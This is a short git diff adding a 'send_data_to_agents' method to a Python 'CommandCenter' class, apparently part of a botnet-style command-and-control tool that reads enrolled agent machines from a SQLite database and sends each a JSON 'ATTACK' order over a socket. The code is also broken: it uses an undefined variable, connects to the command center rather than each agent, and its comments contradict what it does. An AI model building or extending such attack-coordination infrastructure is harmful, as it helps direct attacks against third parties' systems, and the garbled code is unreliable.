@@ -192,3 +192,28 @@ class CommandCenter:
             server.serve_forever(),
             self.update_agent_last_seen()
             )
+        
+    def send_data_to_agents(self):
+        # get all agent ips from the database
+        conn = sqlite3.connect(fr'{self.path}\CC_DATABASE.db')
+        cursor = conn.cursor()
+        cursor.execute("SELECT * FROM AGENT_MACHINES")
+        agent_list = cursor.fetchall()
+        conn.close()
+
+        for i in agent_list:
+            #send data too all agents in list
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                try:
+                        # Send attack message to Command Center
+                        attack_message = json.dumps({"ATTACK": {}})
+                        # Connect to the command center and send the HB
+                        s.connect((self.COMMAND_CENTER, 9191))
+                        s.sendall(attack_message_message.encode())
+                        # close the connection
+                        s.close()
+                        # Print the attack message with the current time
+                        print(f"\033[1;attack sent to Command Center @ {time.ctime()}")
+                        time.sleep(15)
+                except Exception as e:
+                    print(f"\033[1;31mERROR: Failed to send attack instructions to {self.COMMAND_CENTER}: ", e)
